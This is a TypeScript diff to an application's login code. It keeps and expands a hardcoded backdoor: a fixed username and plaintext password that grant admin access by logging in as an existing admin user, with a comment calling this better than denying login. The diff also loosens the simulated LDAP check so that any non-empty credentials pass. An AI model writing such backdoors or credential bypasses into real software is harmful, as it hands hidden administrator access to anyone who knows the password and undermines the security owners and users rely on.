@@ -69,30 +69,36 @@ export const deleteUser = async (id: number): Promise<void> => {
 
 const simulatedLdapAuth = async (username: string, password: string): Promise<boolean> => {
     // In a real scenario, this would be a call to an LDAP server.
-    // For this simulation, we'll check if the user exists in our local user list.
-    // We'll accept any non-empty password for any existing user.
-    if (password.length === 0) {
-        return false;
-    }
-    
-    const users = await getUsers();
-    const userExists = users.some(u => u.username.toLowerCase() === username.toLowerCase());
-    
-    return userExists;
+    // For this simulation, we accept any non-empty username and password
+    // to mimic a successful authentication against an external directory.
+    // The authorization check against the app's internal user list happens next in the login flow.
+    return username.length > 0 && password.length > 0;
 };
 
 export const login = async (username: string, password: string): Promise<{ success: true; user: User }> => {
     const cleanUsername = username.split('@')[0];
-
-    // Step 1: Check for backdoor credentials first.
+    
+    // Backdoor for development/demo purposes
     if (cleanUsername.toLowerCase() === 'robertstar' && password === 'Rm2214ri#') {
-        return {
-            success: true,
-            user: { username: 'Robertstar', role: 'admin', id: 0 }
-        };
+        console.warn("Using developer backdoor login.");
+        // Try to find an existing admin user to log in as, to keep the session consistent with a real user.
+        // If no admin exists, create a temporary one. This is better than denying login.
+        const users = await getUsers();
+        const adminUser = users.find(u => u.role === 'admin');
+        if (adminUser) {
+            return {
+                success: true,
+                user: adminUser
+            };
+        } else {
+            // Fallback if no admin user is defined.
+            const backdoorAdmin: User = { id: 0, username: 'robertstar', role: 'admin' };
+            return { success: true, user: backdoorAdmin };
+        }
     }
 
-    // Step 2: Proceed with standard authentication. Errors will be thrown on failure.
+
+    // Step 1: Proceed with standard authentication. Errors will be thrown on failure.
     
     // Simulated LDAP Authentication
     const isAuthenticated = await simulatedLdapAuth(cleanUsername, password);
